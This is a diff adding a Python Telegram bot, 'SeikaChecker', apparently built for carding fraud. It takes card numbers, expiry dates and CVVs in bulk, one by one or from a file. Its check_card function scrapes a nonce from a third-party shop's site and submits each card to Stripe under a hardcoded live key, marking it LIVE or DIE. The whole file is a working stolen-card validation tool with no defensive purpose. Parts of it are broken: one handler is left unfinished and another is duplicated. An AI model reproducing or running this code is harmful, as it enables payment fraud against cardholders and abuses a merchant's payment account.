@@ -1,0 +1,256 @@
+import re, os, aiohttp, json, asyncio
+from telegram import Update, Document, InlineKeyboardMarkup, InlineKeyboardButton
+from telegram.ext import ContextTypes
+from config import OWNER_ID
+
+ADMIN_FILE = "admins.json"
+checking_users = set()
+user_live_results = {}
+
+def get_admins():
+    if not os.path.exists(ADMIN_FILE):
+        return [OWNER_ID]
+    with open(ADMIN_FILE) as f:
+        return json.load(f)
+
+def save_admins(admins):
+    with open(ADMIN_FILE, "w") as f:
+        json.dump(admins, f)
+
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text(
+        "<b>Welcome to SeikaChecker</b>\nUse /mass or /txt to check your cards.\nBot by @blacky_120",
+        parse_mode="HTML")
+
+async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.effective_user.id != OWNER_ID:
+        return await update.message.reply_text("⛔ Unauthorized")
+    context.user_data['stop'] = False
+    checking_users.discard(update.effective_user.id)
+    await update.message.reply_text("<b>⛔ Stopped</b>\nBot by @blacky_120", parse_mode="HTML")
+
+async def admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.effective_user.id != OWNER_ID:
+        return await update.message.reply_text("⛔ Only owner can use this")
+    try:
+        new_id = int(context.args[0])
+        admins = get_admins()
+        if new_id not in admins:
+            admins.append(new_id)
+            save_admins(admins)
+            await update.message.reply_text("✅ Admin added.")
+        else:
+            await update.message.reply_text("⚠️ Already an admin.")
+    except:
+        await update.message.reply_text("❌ Usage: /admin <user_id>")
+
+async def listadmins(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.effective_user.id != OWNER_ID:
+        return await update.message.reply_text("⛔ Only owner can view admins")
+    admins = get_admins()
+    txt = "\n".join([str(a) for a in admins]) or "No admins"
+    await update.message.reply_text(f"👥 Admins List:\n{txt}")
+
+async def deladmin(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.effective_user.id != OWNER_ID:
+        return await update.message.reply_text("⛔ Only owner can delete admins")
+    try:
+        rem_id = int(context.args[0])
+        admins = get_admins()
+        if rem_id in admins and rem_id != OWNER_ID:
+            admins.remove(rem_id)
+            save_admins(admins)
+            await update.message.reply_text("🗑️ Admin removed.")
+        else:
+            await update.message.reply_text("❌ Not an admin or trying to remove OWNER")
+    except:
+        await update.message.reply_text("❌ Usage: /deladmin <user_id>")
+
+async def mass(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    if user_id not in get_admins():
+        return await update.message.reply_text("⛔ Unauthorized")
+    if user_id in checking_users:
+        return await update.message.reply_text("⚠️ Already checking...")
+
+    ccs = re.findall(r"\d{12,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}", update.message.text)
+    if not ccs:
+        return await update.message.reply_text("❌ No valid CCs found")
+
+    max_limit = 1000
+    if len(ccs) > max_limit:
+        ccs = ccs[:max_limit]
+        await update.message.reply_text(f"⚠️ Only first {max_limit} CCs will be checked.")
+
+    checking_users.add(user_id)
+    context.user_data['stop'] = True
+    user_live_results[user_id] = []
+
+    status_msg = await update.message.reply_text(f"🔍 Checking {len(ccs)} CCs...")
+
+    approved, declined = 0, 0
+    total = len(ccs)
+
+
+async def txt(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    if user_id not in get_admins():
+        return await update.message.reply_text("⛔ Unauthorized")
+
+    if user_id in checking_users:
+        return await update.message.reply_text("⚠️ Already checking...")
+
+    if not update.message.reply_to_message or not update.message.reply_to_message.document:
+        return await update.message.reply_text("❌ Reply to a .txt file")
+
+    doc: Document = update.message.reply_to_message.document
+    if not doc.file_name.endswith(".txt"):
+        return await update.message.reply_text("❌ Not a .txt file")
+
+    checking_users.add(user_id)
+    context.user_data['stop'] = True
+    user_live_results[user_id] = []
+
+    file = await doc.get_file()
+    path = f"cc_{user_id}.txt"
+    await file.download_to_drive(path)
+    with open(path) as f:
+        ccs = [line.strip() for line in f if "|" in line]
+
+    if not ccs:
+        checking_users.discard(user_id)
+        return await update.message.reply_text("❌ File empty")
+
+    status_msg = await update.message.reply_text("📂 Checking file...")
+    approved = 0
+    declined = 0
+    total = len(ccs)
+
+    async def update_status():
+        kb = [[
+            InlineKeyboardButton(f"✅ {approved}", callback_data="noop"),
+            InlineKeyboardButton(f"❌ {declined}", callback_data="noop"),
+            InlineKeyboardButton(f"📦 {total}", callback_data="noop")
+        ]]
+        try:
+            await status_msg.edit_reply_markup(reply_markup=InlineKeyboardMarkup(kb))
+        except:
+            pass
+
+    semaphore = asyncio.Semaphore(10)
+
+    async def check_and_count(cc):
+        nonlocal approved, declined
+        async with semaphore:
+            result = await check_card(cc)
+            if result.startswith("✅"):
+                approved += 1
+                user_live_results[user_id].append(result)
+            elif result.startswith("❌"):
+                declined += 1
+            await update_status()
+
+    tasks = [check_and_count(cc) for cc in ccs]
+    await asyncio.gather(*tasks)
+
+    checking_users.discard(user_id)
+    await update.message.reply_text("✅ File check done.")
+
+    if user_live_results[user_id]:
+        dump = "\n".join(user_live_results[user_id])
+        await update.message.reply_text(f"<b>LIVE:</b>\n{dump}", parse_mode="HTML")
+    user_live_results.pop(user_id, None)
+    file = await doc.get_file()
+    path = f"cc_{user_id}.txt"
+    await file.download_to_drive(path)
+    with open(path) as f:
+        ccs = [line.strip() for line in f if "|" in line]
+
+    if not ccs:
+        checking_users.discard(user_id)
+        return await update.message.reply_text("❌ File empty")
+
+    status_msg = await update.message.reply_text("📂 Checking file...")
+    approved = 0
+    declined = 0
+    total = len(ccs)
+
+    async def update_status():
+        kb = [[
+            InlineKeyboardButton(f"✅ {approved}", callback_data="noop"),
+            InlineKeyboardButton(f"❌ {declined}", callback_data="noop"),
+            InlineKeyboardButton(f"📦 {total}", callback_data="noop")
+        ]]
+        try:
+            await status_msg.edit_reply_markup(reply_markup=InlineKeyboardMarkup(kb))
+        except:
+            pass
+
+    for cc in ccs:
+        result = await check_card(cc)
+        if result.startswith("✅"):
+            approved += 1
+            user_live_results[user_id].append(result)
+        elif result.startswith("❌"):
+            declined += 1
+        await update_status()
+        if not context.user_data.get('stop'):
+            break
+
+    checking_users.discard(user_id)
+    await update.message.reply_text("✅ File check done.", parse_mode="HTML")
+
+    if user_live_results[user_id]:
+        dump = "\n".join(user_live_results[user_id])
+        await update.message.reply_text(f"<b>Approved:</b>\n{dump}", parse_mode="HTML")
+    user_live_results.pop(user_id, None)
+
+async def st(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    if user_id not in get_admins():
+        return await update.message.reply_text("⛔ Unauthorized")
+
+    ccs = re.findall(r"\d{12,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}", update.message.text)
+    if not ccs:
+        return await update.message.reply_text("❌ No valid CC format")
+
+    cc = ccs[0]
+    await update.message.reply_text(f"🔍 Checking:\n<code>{cc}</code>", parse_mode="HTML")
+    result = await check_card(cc)
+    await update.message.reply_text(result)
+
+async def check_card(cc: str) -> str:
+    DOMAIN = "https://infiniteautowerks.com"
+    PK = "pk_live_51MwcfkEreweRX4nmQHMS2A6b1LooXYEf671WoSSZTusv9jAbcwEwE5cOXsOAtdCwi44NGBrcmnzSy7LprdcAs2Fp00QKpqinae"
+    try:
+        number, month, year, cvv = cc.strip().split("|")
+        year = year if len(year) == 4 else "20" + year
+        async with aiohttp.ClientSession() as s:
+            for _ in range(3):  # Retry up to 3 times
+                try:
+                    r1 = await s.get(f"{DOMAIN}/my-account/add-payment-method/")
+                    t1 = await r1.text()
+                    nonce = t1.split('"createAndConfirmSetupIntentNonce":"')[1].split('"')[0]
+                    if nonce:
+                        break
+                except:
+                    continue
+            else:
+                return f"⚠️ Nonce fail: {cc}"
+
+            data = {
+                "type": "card", "card[number]": number, "card[exp_month]": month, "card[exp_year]": year,
+                "card[cvc]": cvv, "billing_details[address][postal_code]": "99501", "billing_details[address][country]": "US",
+                "key": PK, "_stripe_version": "2024-06-20"
+            }
+            headers = {"content-type": "application/x-www-form-urlencoded"}
+            r2 = await s.post("https://api.stripe.com/v1/payment_methods", data=data, headers=headers)
+            t2 = await r2.text()
+            if '"succeeded"' in t2:
+                return f"✅ LIVE: {cc}"
+            elif "card_declined" in t2:
+                return f"❌ DIE: {cc}"
+            else:
+                return f"⚠️ Unknown: {cc}"
+    except Exception as e:
+        return f"⚠️ Error: {cc}"
